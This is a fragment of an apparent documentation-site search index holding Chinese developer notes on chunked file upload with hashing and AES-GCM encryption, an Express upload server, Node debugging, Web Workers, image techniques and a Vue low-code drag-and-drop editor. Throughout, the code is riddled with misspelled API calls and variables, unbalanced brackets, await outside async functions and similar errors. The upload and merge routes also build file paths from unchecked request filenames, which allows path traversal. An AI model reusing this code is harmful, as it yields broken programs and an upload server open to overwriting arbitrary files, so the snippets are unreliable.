\u6240\u6709\u5206\u7247\u4e0a\u4f20\u5e76\u5408\u5e76\u540e\uff0c\u8ba1\u7b97\u6574\u4e2a\u6587\u4ef6\u7684\u54c8\u5e0c\u503c\uff0c\u786e\u4fdd\u4e0e\u5ba2\u6237\u7aef\u53d1\u9001\u7684\u521d\u59cb\u54c8\u5e0c\u503c\u5339\u914d 4. \u5982\u679c\u54c8\u5e0c\u503c\u4e0d\u5339\u914d\uff0c\u670d\u52a1\u5668\u5e94\u5220\u9664\u5df2\u4e0a\u4f20\u7684\u6587\u4ef6\uff0c\u5e76\u5411\u5ba2\u6237\u7aef\u62a5\u9519</p> <pre><code>async function calculateHashForFile(filepath) {\n  return new Promise((resolve, reject) =&gt; {\n    const hash = crypto.createHash('sha256')\n    const stream = fs.createReadStream(filepath)\n    stream.on('data', (chunk) =&gt; {\n      hash.update(chunk)\n    })\n    stream.on('end', () =&gt; {\n      const hashValue = hash.digext('hex')\n      resolve(hashValue)\n    })\n  }\n}\n\nasync function validateFile(filename, originalFileHash){\n  const filepath = path.resolve(PUBLIC_DIR, filename)\n  const calculatedFileHash = await calculateHashForFile(filepath)\n  if( originalFileHash  !== calculatedFileHash) {\n    await fs.unlink(filepath)\n  }\n}\n</code></pre>"},{"location":"projects/file-upload/#57","title":"5.7 \u6587\u4ef6\u52a0\u5bc6","text":"<p>\u4e3a\u9632\u6b62\u6587\u4ef6\u88ab\u7aa5\u63a2\uff0c\u5ba2\u6237\u7aef\u52a0\u5bc6\u6587\u4ef6\u5207\u7247\uff0c\u7136\u540e\u5728\u670d\u52a1\u7aef\u89e3\u5bc6</p> <p>\uff08\u5ba2\u6237\u7aef\uff09 <pre><code>async function encryptChunk(chunk, key) {\n  const algorithm = {\n    name: \"AES-GCM\",\n    iv: window.crypto.getRandomValues(new Uint8Array(12))\n  }\n\n  const encryptedChunk = await window.crypto.subtle.encrypt(algorithm, key, chunk)\n  return { encryptedChunk, iv: alogorith.iv }\n}\n</code></pre></p> <p>\u5c06\u5bc6\u94a5\u5b89\u5168\u5730\u5bfc\u51fa\u5e76\u63d0\u4f9b\u7ed9\u670d\u52a1\u7aef\u5f00\u53d1\u4eba\u5458 \u5bc6\u94a5\u5bfc\u51fa\u683c\u5f0f(\u901a\u5e38\u662f<code>raw</code>\u6216<code>jwk</code>)</p> <p>JWK\uff08JSON Web Key \u683c\u5f0f: A JSON object that represents a cryptographic key</p> <p>\u901a\u8fc7 Web Cryptography API\u4e2d\u7684<code>generateKey</code>\u65b9\u6cd5\u6765\u751f\u6210\u5bc6\u94a5\uff0c<code>exportKey</code>\u65b9\u6cd5\u6765\u5bfc\u51fa\u5bc6\u94a5\uff0c <pre><code>async function generateKey(){\n  // f(alogrithm, extractable, keyUsages)\n  const key = await window.crypto.subtle.generateKey(\n    {\n      nmae:\"AES-GCM\",\n      length: 256\n    },\n    true //\u662f\u5426\u5bfc\u51fa,\n    [\"encrypt\",\"decrypt\"]\n  )\n}\n\n\nasync function downloadKeyAsFile(key, filename) {\n  const expotedKey = await crypto.subtle.exportKey(\"raw\", key)\n  const blob = new Blob([exportedKey], {type:\"application/octet-stream\")\n  const url = URL.createObjectURL(blob)\n  const a = document.createElement(\"a\")\n  a.href = url\n  a.download = filename\n  document.body.appendChild(a)\n  a.click()\n  window.URL.revokeObjectURL(url)\n  document.body.removeChild(a)\n}\n</code></pre> \u5c06\u5bc6\u94a5\u5bfc\u51fa\u4e3a<code>jwk</code>\u683c\u5f0f <pre><code>async function downloadKeyAsFile(key, fileName) {\n    try {\n        const exportedKey = await window.crypto.subtle.exportKey(\"jwk\", key);\n        // f(value, ?replaceer, ?space)\n        const jsonStr = JSON.stringify(exportedKey, null, 4);\n        const blob = new Blob([jsonStr], {type: \"application/json\"});\n        const url = URL.createObjectURL(blob);\n        const a = document.createElement(\"a\");\n        a.href = url;\n        a.download = fileName;\n        document.body.appendChild(a);\n        a.click();\n        window.URL.revokeObjectURL(url);\n        document.body.removeChild(a);\n    } catch (e) {\n        console.error(\"\u5bc6\u94a5\u5bfc\u51fa\u9519\u8bef: \", e);\n    }\n}\n</code></pre></p>"},{"location":"projects/file-upload/#_3","title":"\u5b89\u5168\u4f20\u8f93\u5bc6\u94a5","text":""},{"location":"projects/file-upload/#58-oss","title":"5.8 \u4e0a\u4f20\u963f\u91cc\u4e91\u7684OSS\u4e91\u670d\u52a1","text":""},{"location":"projects/file-upload/#6","title":"6.\u540e\u7aef\u5b9e\u73b0","text":""},{"location":"projects/file-upload/#61","title":"6.1 \u521b\u5efa\u9879\u76ee","text":"<pre><code>npm init -y\nnpm install express morgan http-status-codes http-errors cors fs-extra\n</code></pre> <p><code>src/index.js</code></p> <pre><code>// \u5f15\u5165 Express \u6a21\u5757\nconst express = require(\"express\");\n// \u5f15\u5165 Morgan \u65e5\u5fd7\u8bb0\u5f55\u6a21\u5757\nconst logger = require(\"morgan\");\n// \u5f15\u5165 HTTP \u72b6\u6001\u7801\nconst { StatusCodes } = require(\"http-status-codes\");\n// \u5f15\u5165 CORS \u8de8\u57df\u8d44\u6e90\u5171\u4eab\u6a21\u5757\nconst cors = require(\"cors\");\n// \u5f15\u5165 path \u6a21\u5757\u5904\u7406\u6587\u4ef6\u8def\u5f84\nconst path = require(\"path\");\n// \u5f15\u5165 fs-extra \u6a21\u5757\u5904\u7406\u6587\u4ef6\u7cfb\u7edf\nconst fs = require(\"fs-extra\");\n// \u5f15\u5165\u521b\u5efa HTTP \u9519\u8bef\u7684\u6a21\u5757\nconst createError = require('http-errors');\nconst CHUNK_SIZE = 100 * 1024 * 1024\n\nconst TEMP_DIR = path.resolve(__dirname, \"temp\")\n\n\nconst app = express()\napp.use(logger(\"dev\"))\napp.use(express.json())\napp.use(express.urlencoded({extended: true))\napp.use(cors())\napp.use(express.static(path.resolve(__dirname, \"public\"))\n\n\n  // \u5904\u7406\u4e0a\u4f20\u6587\u4ef6\u7684\u8bf7\u6c42\napp.post(\"/upload/:filename\", async (req, res, next) =&gt; {\n  try{\n  // \u4ece\u8def\u5f84\u53c2\u6570\u4e2d\u83b7\u53d6\u6587\u4ef6\u540d\n  const {filename} = req.params;\n  // \u4ece\u67e5\u8be2\u53c2\u6570\u4e2d\u83b7\u53d6\u5757\u6587\u4ef6\u540d\n  const chunkname = req.query.chunkname\n  // \u4ece\u67e5\u8be2\u53c2\u6570\u4e2d\u83b7\u53d6\u8d77\u59cb\u4f4d\u7f6e\n  const start = isNaN(req.query.start) ? 0 : parseInt(req.query.start, 10)\n  // \u5b9a\u4e49\u5757\u6587\u4ef6\u5b58\u653e\u8def\u5f84\n  const chunkDir = path.resolve(TEMP_DIR, filename)\n  const chunkPath = path.resolve(chunkDir,chunkname)\n  // \u786e\u4fdd\u5757\u6587\u4ef6\u5939\u5b58\u5728\n  await fs.ensureDir(chunkDir)\n  // \u521b\u5efa\u5199\u5165\u6d41\n  const ws = fs.createWriteStream(chunkPath, {start, flags:\"a\"})\n  // \u5982\u679c\u8bf7\u6c42\u4e2d\u65ad\uff0c \u5173\u95ed\u5199\u5165\u6d41\n  req.on(\"aborted\", () =&gt; {\n    ws.close()\n  })\n  await pipeStream(req,ws)\n  res.json({success: true})\n  } catch (error) {\n    next(error)\n  }\n})\n\n\napp.get(\"/merge/:filename\", async (req, res, next) =&gt; {\n  // \u4ece\u8bf7\u6c42url\u4e2d\u7684\u8def\u5f84\u53c2\u6570\u83b7\u53d6\u6587\u4ef6\u540d\n  const {filename} = req.params\n  // \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5df2\u5728\u516c\u5171\u76ee\u5f55\u4e2d\u5b58\u5728\n  const filepath  = path.resolve(PUBLIC_DIR, filename)\n  try {\n    await mergeChunks(filename)\n    res.json({success: true})\n  } catch(error) {\n    next(error)\n  }\n\n})\n\napp.get(\"/verify/:filename\", async (req, res, next) =&gt; {\n  // \u4ece\u8bf7\u6c42url\u4e2d\u7684\u8def\u5f84\u53c2\u6570\u83b7\u53d6\u6587\u4ef6\u540d\n  const {filename} = req.params\n  // \u68c0\u67e5\u6587\u4ef6\u662f\u5426\u5df2\u7ecf\u5728\u516c\u5171\u76ee\u5f55\u5b58\u5728\n  const filepath = path.resolve(PUBLIC_DIR, filename)\n  const existFile = await fs.pathExists(filepath)\n  if (existFile) {\n    return res.json({ success: true, needUpload: false})\n  }\n\n  // \u68c0\u67e5\u4e34\u65f6\u76ee\u5f55\u662f\u5426\u5b58\u5728\n  const tempDir = path.resolve(TEMP_DIR, filename)\n  const exist = await fs.pathExists(tempDir)\n  // \u521d\u59cb\u5316\u4e0a\u4f20\u5217\u8868\n  const uploadList = []\n  if (exist) {\n    // \u83b7\u53d6\u4e34\u65f6\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u5206\u7247\n    const chunksname = await fs.readdir(temDir)\n    // \u751f\u6210\u4e0a\u4f20\u5217\u8868\n    uploadList  = Promise.all(\n      chunksname.map(async (chunkname) =&gt; {\n        const stat = await fs.stat(path.resolve(tempDir,chunkname)\n        return {chunkname, size: stat.size}\n      })\n    )\n  }\n  // \u8fd4\u56de\u4e0a\u4f20\u7684\u5206\u7247\u5217\u8868\n  res.json({success: true, needUpload: true, uploadList})\n})\n\napp.use((req, res, next) =&gt; {\n  next(createError(StatusCodes.NOT_FOUND))\n})\n\napp.use((error, req, res, next) =&gt; {\n  console.error(error)\n  res.status(error.status || StatusCode.INTERNAL_SERVER_ERROR);\n  res.json({success: false, error: error.message})\n})\n\n\nfunction pipeStream(rs, ws) {\n      return new Promise((resolve, reject) =&gt; {\n        re.pipe(ws).on(\"finish\", resolve).on(\"error\", reject)\n      }\n}\n\nfunction mergerChunks(filename) {\n  const filePath = path.resolve(PUBLIC_DIR, filename)\n  const chunksDir = path.resolve(TEMP_DIR)\n  const chunksName = await fs.readdir(chunkDir)\n  // \u5bf9\u5757\u6587\u4ef6\u6392\u5e8f\n  chunksName.sort((a, b) =&gt; Number(a.split('-').pop()) - Number(b.split('-').pop()))\n\n  // \u5408\u5e76\u6240\u6709\u5757\u6587\u4ef6\n  await Promise.all(\n  chunksname.map((chunkname, idnex) =&gt; {\n    pipeStream(\n      fs.createReadStream(path.resolve(chunksDir, chunkname), {autoClose: true})\n      fs.createWriteStream(filePath, {start: index * CHUNK_SIZE })\n    )\n  })\n  )\n  // \u5220\u9664\u4e34\u65f6\u6587\u4ef6\u5939\n  await fs.rmdir(chunksDir, { recursive: true} )\n}\n\n// \u542f\u52a8\u670d\u52a1\u5668\u76d1\u542c8080\u7aef\u53e3\napp.listen(8080, ()=&gt; console.log('Server started on prot 8080')\n</code></pre> <p><code>src/package.json</code></p> <pre><code>{\n  \"scripts\": {\n    \"start\": \"nodemon index.js\"\n  }\n}\n</code></pre>"},{"location":"projects/file-upload/#7","title":"7.\u53c2\u8003","text":""},{"location":"projects/file-upload/#71-nodejs","title":"7.1 nodejs\u8c03\u8bd5","text":"<ul> <li>debugger @ Node.js v22.4.1 documentation &gt;  Table of contents &gt; Index  Other versions &gt; Options</li> </ul> <p><code>NODE_INSPECT_RESUME_ON_START=1 node inspect index.js</code>\uff1a node debug <code>node --inpsect index.js</code>: open v8 inpsector <code>repl</code>: \u6253\u5370\u53d8\u91cf <code>cont</code> c: Continue execution <code>next</code> n: Step next <code>step</code> s: Step in</p>"},{"location":"projects/file-upload/#73-flags","title":"7.3 flags","text":"<p><code>r</code>\uff1a\u4ee5\u53ea\u8bfb\u65b9\u5f0f\u6253\u5f00\u6587\u4ef6\u3002\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\uff0c\u5219\u629b\u51fa\u5f02\u5e38\u3002</p> <p><code>w</code>\uff1a\u4ee5\u5199\u5165\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\u3002\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\u5219\u521b\u5efa\u6587\u4ef6\uff0c\u5982\u679c\u6587\u4ef6\u5b58\u5728\u5219\u622a\u65ad\uff08\u6e05\u7a7a\uff09\u6587\u4ef6\u3002</p> <p><code>wx</code>\uff1a\u7c7b\u4f3c\u4e8e w\uff0c\u4f46\u5982\u679c\u6587\u4ef6\u5df2\u5b58\u5728\u5219\u5931\u8d25\u3002</p> <p><code>a</code>\uff1a\u4ee5\u8ffd\u52a0\u6a21\u5f0f\u6253\u5f00\u6587\u4ef6\u3002\u5982\u679c\u6587\u4ef6\u4e0d\u5b58\u5728\u5219\u521b\u5efa\u6587\u4ef6\u3002</p> <p><code>ax</code>\uff1a\u7c7b\u4f3c\u4e8e a\uff0c\u4f46\u5982\u679c\u6587\u4ef6\u5df2\u5b58\u5728\u5219\u5931\u8d25\u3002</p>"},{"location":"projects/file-upload/#74-web-workers","title":"7.4 Web Workers","text":"<p>\u4e0eUI\u7ebf\u7a0b\u5206\u79bb\u7684\u540e\u53f0\u7ebf\u7a0b</p> <ol> <li>\u521b\u5efaWoker\u6587\u4ef6\uff0c \u5305\u542b\u5728Worker\u7ebf\u7a0b\u4e2d\u8fd0\u884c\u7684\u4ee3\u7801</li> </ol> <pre><code>self.addEventListener('message', function(e){\n  // \u63a5\u53d7\u4e3b\u7ebf\u7a0b\u6d88\u606f\n  const result = e.data\n})\n</code></pre> <ol> <li>\u5728\u4e3b\u7ebf\u7a0b\u4e2d\u4f7f\u7528Worker\uff0c\u518d\u4e3b\u7ebf\u7a0b\u521b\u5efaworker\u7684\u5b9e\u4f8b\u5e76\u4e0e\u4e4b\u901a\u4fe1</li> </ol> <pre><code>// \u521b\u5efa Worker \u5b9e\u4f8b\nconst getFileNameWorker = new Worker('./worker.js')\n// \u5411 Worker \u53d1\u9001\u6570\u636e\ngetFileNameWorker.postMessage(file)\n// \u76d1\u542c Worker \u53d1\u56de\u6765\u7684\u6d88\u606f\ngetFileNameWorker.addEventListener('message', e =&gt; {\n  const filename = e.data\n})\n</code></pre> <p>\u5e94\u7528\u573a\u666f Web Workers \u975e\u5e38\u9002\u5408\u7528\u4e8e\u90a3\u4e9b\u9700\u8981\u5927\u91cf\u8ba1\u7b97\u4e14\u53ef\u80fd\u4f1a\u963b\u585e UI \u7684\u4efb\u52a1\uff0c\u5982\u56fe\u50cf\u5904\u7406\u3001\u5927\u6570\u636e\u8ba1\u7b97\u3001\u590d\u6742\u7684\u6392\u5e8f\u6216\u641c\u7d22\u64cd\u4f5c\u7b49\u3002\u901a\u8fc7\u5c06\u8fd9\u4e9b\u64cd\u4f5c\u79fb\u5230\u540e\u53f0\u7ebf\u7a0b\uff0c\u53ef\u4ee5\u4fdd\u6301\u524d\u7aef\u754c\u9762\u7684\u6d41\u7545\u548c\u54cd\u5e94\u3002</p>"},{"location":"projects/file-upload/#77","title":"7.7 \u4e8c\u8fdb\u5236\u5bf9\u8c61","text":"<p>\u8fd9\u5f20\u56fe\u662f\u524d\u7aef JavaScript \u5904\u7406\u4e8c\u8fdb\u5236\u6570\u636e\u6d41\u548c\u56fe\u50cf\u7684\u6d41\u7a0b\u56fe\uff0c\u5b83\u8be6\u7ec6\u5730\u5c55\u793a\u4e86\u4e0d\u540c\u7684 Web API \u4e4b\u95f4\u7684\u5173\u7cfb\u53ca\u5176\u7528\u9014 \u5de6\u4e0a\u89d2: Canvas\u64cd\u4f5c - canvas: \u4ee3\u8868HTML\u4e2d\u7684<code>&lt;canvas&gt;</code>\u5143\u7d20, \u7528\u4e8e\u56fe\u50cf\u7ed8\u5236 - canvas.getImageData(): \u4ececanvas\u4e2d\u63d0\u53d6\u56fe\u50cf\u6570\u636e - canvas.toDataURL(): \u5c06canvas\u4e2d\u7684\u5185\u5bb9\u8f6c\u6362\u4e3a\u4e00\u4e2a DATA URL (base64\u7f16\u7801\u7684\u5b57\u7b26\u4e32)</p> <p>\u53f3\u4e0a\u89d2: \u56fe\u50cf - image: \u4ee3\u8868HTML\u7684<code>&lt;img&gt;</code>\u5143\u7d20 - image.src = dataURL \u5c06Data URL\u8bbe\u7f6e\u4e3a\u56fe\u50cf\u7684\u6e90 - image.src = objectURL \u5c06Object URL\u8bbe\u7f6e\u4e3a\u56fe\u50cf\u7684\u6e90,\u6307\u5411\u5185\u5b58\u4e2d\u7684blob\u5bf9\u8c61</p> <p>\u4e2d\u95f4: Object URL - ObjectURL: \u901a\u8fc7<code>URL.createObjectURL(blob)</code> \u521b\u5efa\u4e34\u65f6URL\uff0c\u6307\u5411\u4f20\u5165\u7684Blob\u6216File\u5bf9\u8c61</p>"},{"location":"projects/image_solution/","title":"\u56fe\u7247","text":"<ul> <li> \u9759\u6001\u56fe\u7247\u8d44\u6e90</li> <li> \u672c\u5730\u56fe\u7247</li> <li> \u56fe\u7247\u7f13\u5b58</li> <li> \u7f51\u7edc\u56fe\u7247</li> <li> icon</li> <li> svg</li> <li> placeholder</li> </ul>"},{"location":"projects/image_solution/#images-solution","title":"images solution","text":""},{"location":"projects/image_solution/#img-and-object-position-and-object-fit","title":"img and object-position and object-fit","text":"<p>you have an image that needs to fit its content box without losing the aspect</p> <p>via CSS background-image and give it the background-size: cover property.  <pre><code>background-size: cover\nbackground-image\n</code></pre></p> <p>inline images and style them in CSS with object-fit and object-position instead.</p>"},{"location":"projects/image_solution/#css-spirtes","title":"css spirtes","text":"<p>Etymology  The idea was that the computer could fetch a graphic into memory, and then only display parts of that image at a time, which was faster than having to continually fetch new images. The sprite was the big combined graphi</p> <p>get the image once, and shift it around and only display parts of it. This reduces the overhead of having to fetch multiple images.</p>"},{"location":"projects/image_solution/#data-uris","title":"Data URIs","text":""},{"location":"projects/image_solution/#icon-fonts","title":"Icon Fonts","text":""},{"location":"projects/image_solution/#inline-svg","title":"inline-svg","text":""},{"location":"projects/lowcode/","title":"Lowcode","text":"<p>\u4f4e\u4ee3\u7801\u5f00\u53d1\u5e73\u53f0\uff1a \u91c7\u7528\u56fe\u5f62\u5316\u62d6\u62fd\u548c\u914d\u7f6e\u53c2\u6570\u7684\u65b9\u5f0f\u5b8c\u6210\u5f00\u53d1\u5de5\u4f5c \u7ec4\u6210\uff1a \u7ec4\u4ef6\u533a\u3001\u7f16\u8f91\u533a\u3001\u9884\u89c8\u533a\u3001\u5c5e\u6027\u533a\u3001\u4e8b\u4ef6\u533a\uff0c\u901a\u8fc7\u62d6\u62fd\u751f\u6210JSON,\u901a\u8fc7JSON\u6e32\u67d3\u9875\u9762</p> <p>\u7f16\u8f91\u5668\u5e03\u5c40</p> <p><code>src/data.json</code></p> <pre><code>{\n  \"container\": {\n    \"width\": 500,\n    \"height\": 500\n  },\n  \"blocks\": [\n    {\"top\":100, \"left\": 100, \"zIndex\": 1, \"key\": \"text\"},\n    {\"top\":200, \"left\": 200, \"zIndex\": 1, \"key\": \"button\"},\n    {\"top\":300, \"left\": 300, \"zIndex\": 1, \"key\": \"input\"},\n  ]\n}\n  blocks\n</code></pre> <p><code>src/App.vue</code></p> <pre><code>&lt;template&gt;\n    &lt;Editor v-model={state}/&gt;\n&lt;/template&gt;\n\n\n&lt;script &gt;\nimport {ref, provide} from 'vue'\nimport data from './data,json'\nimport Editor from './packages/editor'\nimport {registerConfig as config} from './utils/editor-config'\nexport default {\n  component: {\n    Editor\n  },\n  setup() {\n    const state = ref(data)\n    provide(\"config\",config) // \u914d\u7f6e\u900f\u4f20\n    return {\n      state\n    }\n  }\n}\n&lt;/script&gt;\n\n&lt;style&gt;\n.app {\n    /* \u56db\u5468\u7559\u767d */\n    position: fixed;\n    inset: 15px;\n}\n\n.line-v {\n    position: absolute;\n    top: 0;\n    bottom: 0;\n    border-left: 1px solid dashed;\n}\n\n\n.line-h {\n    position: absolute;\n    left: 0;\n    right: 0;\n    border-top: 1px solid dashed\n\n}\n&lt;/style&gt;\n</code></pre> <p><code>src/packages/editor.jsx</code></p> <pre><code>import {defineComponent, computed, inject} from 'vue'\nexport default defineComponent({\n  props: {\n    modelValue: {tyep:Object, required: true}\n  },\n  setup(props){\n    const data = computed(() =&gt; {\n      get() {\n        return props.modelValue\n      }\n    })\n\n    const containerStyle = {\n      width: data.value.container.width + 'px',\n      height: data.value.container.width + 'px'\n    }\n\n\n    const foucsData = computed(() =&gt; {\n        const focus = []\n        const unfocusd = []\n        data.value.\n      })\n\n\n    const config = inject(\"config\")\n\n    return () =&gt; (\n      &lt;div class=\"editor\"&gt;\n        &lt;div class=\"editor-left\"&gt;\n          cofig.componentList.map(component =&gt; {\n            &lt;div class=\"editor-left-item\"&gt;\n              &lt;span&gt;{component.label}&lt;/span&gt;\n              &lt;div&gt;{component.preview()}&lt;div&gt;\n            &lt;/div&gt;\n          })\n        &lt;/div&gt;\n        &lt;div class=\"ediotr-top\"&gt; \u9876\u90e8\u83dc\u5355\u680f&lt;/div&gt;\n        &lt;div class=\"ediotr-right\"&gt;\u53f3\u4fa7\u5c5e\u6027\u680f&lt;/div&gt;\n        &lt;div class=\"editor-container\"&gt;\n            {/* \u6eda\u52a8\u6761 */}\n          &lt;div class=\"editor-container-canvas\"&gt;\n            {/* \u5185\u5bb9 */}\n            &lt;div class=\"editor-container-content\" style={containerStyle}&gt;\n              {\n                data.blocks.map(block =&gt; (\n                  &lt;Editor-block block={block}&gt;&lt;/Editor-block&gt;\n                ))\n              }\n            &lt;/div&gt;\n          &lt;/div&gt;\n        &lt;/div&gt;\n      &lt;/div&gt;\n    )\n\n  }\n})\n</code></pre> <p><code>src/packages/editor.scss</code></p> <pre><code>.editor {\n  width: 100%;\n  height: 100%;\n  position: relative\n  &amp;-left, &amp;-right {\n    poistion: absolute;\n    top:0,\n    bottom:0,\n    width: 270px;\n  }\n  &amp;-left {\n    left: 0;\n    &amp;-item{\n    width: 250px;\n    display: flex;\n    align-items:center;\n    justify-content:center;\n    background:#fff;\n    padding:20px;\n    cursor:move,\n    user-select:none;\n    margin-top: 20px;\n    position: absolute;\n    &gt; span {\n      position:absolute;\n      top:0;\n      left:0;\n      background:\n      padding:tea;\n      padding: 4px;\n    }\n    &amp;::after {\n      position:absolute,\n      content: \"\",\n      inset:0\n    }\n    }\n\n  }\n  &amp;-right {\n    right: 0\n  }\n  &amp;-top {\n    position: absolute;\n    left: 280px;\n    right: 280px;\n    height: 80px;\n  }\n  &amp;-container {\n    padding: 80px 270px 0;\n    height: 100%;\n    box-sizing: border-box;\n\n    &amp;-canvas {\n      overflow: scroll;\n      height: 100%;\n      &amp;__content {\n        positon: relative;\n\n      }\n    }\n  }\n}\n\n.editor-block {\n  position: absolute;\n}\n</code></pre> <p><code>src/packages/editor-block.jsx</code></p> <pre><code>import {defineComponent, computed, inject} from 'vue'\nexport default defineComponent({\n  props: {\n    block: {tyep:Object}\n  },\n  setup(props) {\n\n\n    const config =  inject(\"config\")\n\n\n    const blockStyle = computed(() =&gt; {\n      top: `${props.block.top}px`,\n      left: `${props.block.top}px`,\n      zIndex: `${props.block.zIndex}`\n    })\n\n    return () =&gt; {\n      const component = config.componentMap[props.block.key]\n      const RenderComponent = component.render()\n      return (\n        &lt;div class=\"editor-block style={blockStyle.value}&gt;\n          {RenderComponent}\n        &lt;/div&gt;\n      )\n    }\n\n  }\n})\n</code></pre> <p><code>src/utils/ediotr-config.jsx</code></p> <pre><code>function createEditorConfig(){\n  const componentList = []\n  const componentMap = {}\n  return {\n    componentList,\n    componentMap,\n    registerConfig: (component) =&gt; {\n      componentList.push(component)\n      componentMap[component.key] = component\n    }\n  }\n}\n\n\nregisterConfig.register({\n  label: \"\u6587\u672c\",\n  preview: () =&gt; \"\u6587\u672c\",\n  render: () =&gt; \"\u6587\u672c\",\n  key:\"text\"\n})\nregisterConfig.register({\n  label: \"\u6309\u94ae\",\n  preview: () =&gt; &lt;ElButton&gt;\u6309\u94ae&lt;/ElButton&gt;\n  render: () =&gt; &lt;ElButton&gt;\u6309\u94ae&lt;/ElButton&gt;\n  key:\"text\"\n})\nregisterConfig.register({\n  label: \"\u6587\u672c\",\n  preview: () =&gt; &lt;ElInput&gt;\u8f93\u5165\u6846&lt;/ElInput&gt;,\n  render: () =&gt;  &lt;ElInput&gt;\u8f93\u5165\u6846&lt;/ElInput&gt;\n  key:\"text\"\n})\n\n\n\nexport let registerConfig = createEditorConfig()\n</code></pre> <pre><code>const mousemove = (e) =&gt; {\n  if (!dragState.dragging) {\n    events.emit(\"dragstart\")\n  }\n}\n\n\nconst keyboardEvent = (()=&gt;{//\u521d\u59cb\u5316\u4e8b\u4ef6\n  const onKeyDown = (e) =&gt; {\n    // https://developer.mozilla.org/en-US/docs/Web/API/UI_Events/Keyboard_event_code_values\n    // ctrlKey,altKey, metaKey, altKey\n    // \"Escape\", \"Enter\", \" \", \"Tab\"\n    const {ctrlKey, key} = e\n    let keyString = []\n    if (ctrlKey) keyString.push(\"ctrl\")\n    keyString.push(key)\n    keyString = keyString.join(\"+\")\n    state.commandList.forEach(({keyPress, name}) =&gt; {\n      if(keyPress) return; //\u6ca1\u6709\u952e\u76d8\u4e8b\u4ef6\n      if(keyboard === keyString){\n        state.command[name]()\n        e.preventDefault()\n      }\n    }\n  }\n\n  const init = () =&gt; { // \u76d1\u542c\u7a97\u53e3\u4e2d\u4e8b\u4ef6\u6ce8\u518c\u4e8b\u4ef6\u5904\u7406\n    window.addEventListener('keydown', onKeyDown)\n    return  () =&gt; {// \u8fd4\u56de\u6ce8\u518c\u4e8b\u4ef6\u5904\u7406\u9500\u6bc1\u51fd\u6570\n      window.removeEventListener('keydown', onKeyDown)\n    }\n  }\n})()\n\n\n    if (!el.contains.(e.target)){// \u70b9\u51fb\u4e0a\u4e0b\u6587\u83dc\u5355\u5185\u90e8\u4ec0\u4e48\u90fd\u4e0d\u505a\n      setShowDropDown(false)\n    }\n</code></pre>"},{"location":"projects/lowcode/#_1","title":"\u7ec4\u4ef6\u7684\u5355\u9009\u3001\u591a\u9009\u3001\u53d6\u6d88\u9009\u4e2d\u3001\u5168\u9009","text":"<pre><code>let top = Infinity,\n    left = Infinity,\n    bottom = -Infinity,\n    right = -Infinity\n\nassembly.forEach(idx =&gt; {\n  cmp = assembly.get(idx)\n  top = Math.min(top, cmp.style.top)\n  left = Math.min(top, cmp.style.left)\n  bottom = Math.max(bottom, cmp.style.top + cmp.style.height)\n  right = Math.max(right, cmp.style.left + cmp.style-width)\n})\n</code></pre>"},{"location":"projects/lowcode/#_2","title":"\u9009\u4e2d\u7ec4\u4ef6\u7684\u62d6\u62fd","text":"<pre><code>const onMousedown = (e) =&gt; {\n  let startX = e.pageX;\n  let startY = e.pageY;\n\n  const onMousemove = throttle(\uff08e =&gt; {\n    const x = e.pageX;\n    const y = e.pageY;\n\n    const disX = x - startX;\n    const disY = y - startY;\n\n    updataAssemblyByDistance({disX, disY})\n    startX = x;\n    startY = y;\n  }), 50)\n\n  const onMouseup = () =&gt; {\n    doucment.removeEventListener('mousemove', onMousemove)\n    doucment.removeEventListener('mouseup',onMouseup)\n  }\n\n  doucment.addEventListener('mousemove', onMousemove)\n  doucment.addEventListener('mouseup', onMouseup)\n}\n</code></pre> <pre><code>export const updataAssemblyByDistance({disX, disY}:Style){\n  draft.assembly.forEach(idx =&gt; {\n    const cmp = draft.cmps[idx]\n    cmp.style.top += disY\n    cmp.style.left += disX\n  })\n}\n</code></pre>"},{"location":"projects/lowcode/#_3","title":"\u7ec4\u4ef6\u7684\u4f38\u7f29","text":"<p>\u4f38\u7f29\u70b9\u7ed8\u5236 <pre><code>function StretchDots() {\n  const positions = [\n      [\"top\", \"left\"],\n      [\"top\", \"middle\"],\n      [\"top\", \"right\"],\n      [\"middle\", \"left\"],\n      [\"middle\", \"right\"],\n      [\"bottom\", \"left\"],\n      [\"bottom\", \"middle\"],\n      [\"bottom\", \"right\"]\n    ];\n\n  // https://developer.mozilla.org/en-US/docs/Web/CSS/cursor\n  // const positionStyleMap = {\n  //     \"top-left\": \"nwse-resize\",\n  //     \"top-middle\": \"ns-resize\",\n  //     \"top-right\": \"nesw-resize\",\n  //     \"middle-left\": \"e-resize\",\n  //     \"middle-right\": \"w-resize\",\n  //     \"bottom-left\": \"nesw-resize\",\n  //     \"bottom-middle\": \"ns-resize\",\n  //     \"bottom-right\": \"nwse-resize\"\n  //   };\n\n\n  return (\n   // &lt;div class=\"stretch-dot stretch-dot_top-left\" data-direction=\"top, left\"&gt;&lt;/div&gt;\n   {\n    positions.map(position =&gt; {\n      const positionKey = position.join('-')\n      &lt;div\n        key={positionKey}\n        class={`${styles.stretch-dot} stretch-dot_${positionKey} `}\n        // data-direction={position.join(\", \")}\n        onMousedown={onMo}\n        data-direction={positionKey.replace('-', \", \")}\n      &gt;\n      &lt;/div&gt;\n      }\n    )\n   }\n\n\n  )\n\n}\n</code></pre></p> <p><code>stretchDot.module.css</code></p> <pre><code>.stretch-dot_top-left {\n    top: -8;\n    left: -8;\n    cursor: \"nwse-resize\"\n}\n.stretch-dot_top-middle {\n    top: -8;\n    left: 0;\n    cursor: \"n-resize\"\n}\n.stretch-dot_top-right {\n    top: -8;\n    left: 8;\n    cursor: \"nesw-resize\"\n}\n.stretch-dot_middle-left {\n    top: 0;\n    left: -8;\n    cursor: \"w-resize\"\n}\n.stretch-dot_middle-right {\n    top: 0;\n    left: 8;\n    cursor: \"n-resize\"\n}\n.stretch-dot_bottom-left {\n    top: 8;\n    left: -8;\n    cursor: \"nesw-resize\"\n}\n.stretch-dot_bottom-middle {\n    top: 8;\n    left: 0;\n    cursor: \"s-resize\"\n}\n.stretch-dot_bottom-right {\n    top: 8;\n    left: 8;\n    cursor: \"nwse-resize\"\n}\n</code></pre>"},{"location":"projects/lowcode/#_4","title":"\u7f6e\u9876\u3001\u7f6e\u5e95\u3001\u4e0a\u79fb\u3001\u4e0b\u79fb","text":"<pre><code>//\u4e0a\u79fb\nconst upZIndex = () =&gt; {\n  [cmps[selectedIndex], cmps[selectedIndex + 1]] = 